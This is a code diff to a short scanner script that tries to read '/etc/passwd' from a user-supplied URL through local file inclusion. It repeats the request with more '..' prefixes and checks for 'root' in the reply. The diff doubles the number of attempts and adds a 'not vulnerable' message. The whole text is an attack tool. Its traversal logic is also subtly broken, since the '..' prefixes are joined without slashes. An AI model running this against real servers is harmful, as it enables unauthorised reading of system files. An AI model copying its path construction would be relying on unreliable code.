@@ -11,7 +11,7 @@ print "URL Target: "
 input.start()
 	@target = input.value
 	@exploit = "/etc/passwd"
-    for(@loop = 1| @loop <= 10| @loop++)
+    for(@loop = 1| @loop <= 20| @loop++)
         @result = curl.get(@target,@exploit)
         @result = preg_match("/root/i", @result)
         if(@result)
@@ -20,6 +20,10 @@ input.start()
         else
             print "[*] Trying bypass local file inclusion\n"
             @exploit = '..'.@exploit
+        end
+        
+        if(@loop == 20)
+            print "[#] @target not vulnerable\n"
         end
     end
 input.close()
